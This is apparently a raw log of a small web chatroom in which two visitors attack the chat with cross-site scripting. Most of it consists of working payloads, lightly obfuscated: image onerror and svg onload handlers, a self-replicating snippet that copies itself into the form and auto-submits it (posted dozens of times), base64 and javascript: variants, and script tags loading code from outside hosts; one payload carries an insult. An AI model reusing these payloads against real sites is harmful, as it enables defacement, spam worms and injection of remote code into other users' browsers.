+[2023/01/28 15:33:35][<a href="http://60.242.253.123/global//188.25.219.3">/188.25.219.3</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:33:32][<a href="http://60.242.253.123/global//188.25.219.3">/188.25.219.3</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:33:30][<a href="http://60.242.253.123/global//188.25.219.3">/188.25.219.3</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:33:27][<a href="http://60.242.253.123/global//188.25.219.3">/188.25.219.3</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:33:25][<a href="http://60.242.253.123/global//188.25.219.3">/188.25.219.3</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:33:23][<a href="http://60.242.253.123/global//188.25.219.3">/188.25.219.3</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:33:22][<a href="http://60.242.253.123/global//188.25.219.3">/188.25.219.3</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:33:20][<a href="http://60.242.253.123/global//188.25.219.3">/188.25.219.3</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:33:17][<a href="http://60.242.253.123/global//188.25.219.3">/188.25.219.3</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:33:15][<a href="http://60.242.253.123/global//188.25.219.3">/188.25.219.3</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:33:14][<a href="http://60.242.253.123/global//188.25.219.3">/188.25.219.3</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:33:12][<a href="http://60.242.253.123/global//188.25.219.3">/188.25.219.3</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:33:10][<a href="http://60.242.253.123/global//188.25.219.3">/188.25.219.3</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:33:07][<a href="http://60.242.253.123/global//188.25.219.3">/188.25.219.3</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:33:05][<a href="http://60.242.253.123/global//188.25.219.3">/188.25.219.3</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:33:04][<a href="http://60.242.253.123/global//188.25.219.3">/188.25.219.3</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:33:02][<a href="http://60.242.253.123/global//188.25.219.3">/188.25.219.3</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:33:00][<a href="http://60.242.253.123/global//188.25.219.3">/188.25.219.3</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:32:45][<a href="http://60.242.253.123/global//188.25.219.3">/188.25.219.3</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:32:43][<a href="http://60.242.253.123/global//188.25.219.3">/188.25.219.3</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:32:41][<a href="http://60.242.253.123/global//188.25.219.3">/188.25.219.3</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:32:40][<a href="http://60.242.253.123/global//188.25.219.3">/188.25.219.3</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:32:40][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:32:39][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:32:39][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:32:38][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:32:38][<a href="http://60.242.253.123/global//188.25.219.3">/188.25.219.3</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:32:38][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:32:38][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:32:37][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:32:37][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:32:37][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:32:36][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:32:36][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:32:36][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:32:35][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:32:34][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:32:33][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:32:31][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:32:29][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:32:29][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:32:28][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:32:28][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:32:26][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:32:25][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:32:24][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:32:24][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:32:24][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"><br></d;v>
+[2023/01/28 15:31:16][<a href="http://60.242.253.123/global//188.25.219.3">/188.25.219.3</a>]<d;v> <span class="amazing2"><img src="Welcome%20To%20My%20Web%20Site%20)_files/1.html" 0n3rr0r="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing2')[d0cument.getElementsByClassName('amazing2').length-1].innerHTML; d0cument.getElementById('f0rm1').submit.click();"></span>AMOGUS<br></d;v>
+[2023/01/28 15:22:00][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> $cript doesnt work silly<br></d;v>
+[2023/01/28 15:21:39][77.243.25.8]<d;v> 
+123&amp;CSRT=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&amp;X_x=&lt;$cript&gt;@lert(1234)<!--$cript--><br></d;v>
+[2023/01/28 15:20:14][<a href="http://60.242.253.123/global//188.25.219.3">/188.25.219.3</a>]<d;v>
+ 
+&lt;$cript&gt;console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing')[d0cument.getElementsByClassName('amazing').length-1].innerHTML;
+ d0cument.getElementById('f0rm1').submit.click();<!--$cript--><br></d;v>
+[2023/01/28 15:18:56][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> ohiorooms<br></d;v>
+[2023/01/28 15:18:40][77.243.25.8]<d;v> </d;v> %00"&gt;&lt;$cript&gt;@lert(1)<!--$cript--><br>
+[2023/01/28 15:18:11][77.243.25.8]<d;v> Ohio<br></d;v>
+[2023/01/28 15:18:00][77.243.25.8]<d;v> %00"&gt;&lt;$cript&gt;@lert(1)<!--$cript--><br></d;v>
+[2023/01/28 15:16:36][77.243.25.8]<d;v> PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==<br></d;v>
+[2023/01/28 15:15:49][77.243.25.8]<d;v> <base+href="j@va$cript:@lert(1); "=""><br></base+href="j@va$cript:@lert(1);></d;v>
+[2023/01/28 15:13:53][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> whacha doin<br></d;v>
+[2023/01/28 15:12:58][77.243.25.8]<d;v> &lt;$cript&gt;@lert("X_x")<!--$cript--><br></d;v>
+[2023/01/28 15:10:41][<a href="http://60.242.253.123/global//188.25.219.3">/188.25.219.3</a>]<d;v> <span class="amazing">&lt;$vg/0nl0ad="console.log(1);d0cument.getElementById('txthere').innerHTML=d0cument.getElementsByClassName('amazing')[0].innerHTML;d0cument.getElementById('f0rm1').submit.click();"&gt;</span><br></d;v>
+[2023/01/28 15:08:51][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> he does pen testing for free<br></d;v>
+[2023/01/28 15:07:17][77.243.25.8]<d;v> ¼$cript¾@lert(¢X_x¢)¼/$cript¾<br></d;v>
+[2023/01/28 15:06:43][77.243.25.8]<d;v> Die<br></d;v>
+[2023/01/28 15:06:35][77.243.25.8]<d;v> &lt;$cript&gt;@lert("X_x");<!--$cript--><br></d;v>
+[2023/01/28 15:06:21][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> chat broken <br></d;v>
+[2023/01/28 15:05:56][77.243.25.8]<d;v> 
+<br><img src="Welcome%20To%20My%20Web%20Site%20)_files/XDx6AXDx61XDx76XDx61XDx73XDx63XDx72XDx69XDx70XDx74XDx3AXDx6.html"><br></d;v>
+[2023/01/28 15:04:46][77.243.25.8]<d;v> &lt;\X_x&gt;  <bod¥ 0nl0ad="@lert('slendi" is="" gay')=""><br></bod¥></d;v>
+[2023/01/28 15:02:39][77.243.25.8]<d;v> What<br></d;v>
+[2023/01/28 15:02:21][77.243.25.8]<d;v> &lt;$vg/0nl0ad=@lert('X_x')&gt;<br></d;v>
+[2023/01/28 15:01:34][77.243.25.8]<d;v> <d;v 0nl0ad="@lert('X_x')"><br></d;v>
+[2023/01/28 15:01:31][<a href="http://60.242.253.123/global//60.242.253.123">/60.242.253.123</a>]<d;v> <img src="Welcome%20To%20My%20Web%20Site%20)_files/epic-embed-fail-gif-24167425.html"><br>&lt;="" d;v=""&gt;
+[2023/01/28 15:00:55][77.243.25.8]<d;v> <bod¥ 0nl0ad="@lert('slendi" is="" gay')=""><br></bod¥></d;v>
+[2023/01/28 14:59:18][77.243.25.8]<d;v> <iframe src="http://X_x.rocks/$criptlet.html" <<="" button="">&lt;/form&gt;&lt;/h1&gt;&lt;/ul&gt;</iframe><br></d;v>
+[2023/01/28 14:57:43][77.243.25.8]<d;v> &lt;$cript SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-X_x.rocks/index.js&gt;<!--$cript--><br></d;v>
+[2023/01/28 14:56:19][77.243.25.8]<d;v> &lt;$cript type="text/j@va$cript" src="https://leaverou.github.io/prefixfree/prefixfree.min.js"&gt;<!--$cript-->
+<br>
+<br><d;v id="pingpong">
+<br>    <d;v id="t@ble">
+<br>        <d;v id="line"></d;v> 
+<br>        <d;v id="net-top"></d;v>  
+<br>        <d;v id="net-middle"></d;v>  
+<br>        <d;v id="net-bottom"></d;v>  
+<br>        <d;v id="net-shadow"></d;v>      
+<br>    </d;v>
+<br>        
+<br>    <d;v id="c1">
+<br>        <d;v id="b1"></d;v>   
+<br>    </d;v>
+<br>    <d;v id="c2">
+<br>        <d;v id="b2"></d;v>   
+<br>    </d;v>
+<br>    <d;v id="c3">
+<br>        <d;v id="b3"></d;v>   
+<br>    </d;v>
+<br>    <d;v id="c4">
+<br>        <d;v id="b4"></d;v>   
+<br>    </d;v>
+<br>    <span id="ping">PING</span>
+<br>    <span id="pong">PONG</span>
+<br></d;v><br></d;v>
+[2023/01/28 14:55:38][77.243.25.8]<d;v> <style>
+<br> @keyframes rotateC4 {
+<br>    0%, 34% {
+<br>        opacity: 0;
+<br>    }
+<br>    35% {
+<br>        opacity: 1;
+<br>        transf0rm: rotate(-39deg);
+<br>    }
+<br>    50% {
+<br>        opacity: 1;
+<br>        transf0rm: rotate(15deg);
+<br>    }
+<br>    51%, 100% {
+<br>        opacity: 0;
+<br>    }
+<br>}
+<br>
+<br>#b1, #b2, #b3, #b4 {
+<br>    position: @bsolute;
+<br>    width: 10px;
+<br>    height: 10px;
+<br>    background: white;
+<br>    border-radius: 10px;
+<br>}
+<br>#b1, #b2 {    
+<br>    top: -5px;
+<br>    left: 145px;
+<br>}
+<br>#b3, #b4 {    
+<br>    top: -5px;
+<br>    left: 70px;
+<br>}
+<br></style><br></d;v>
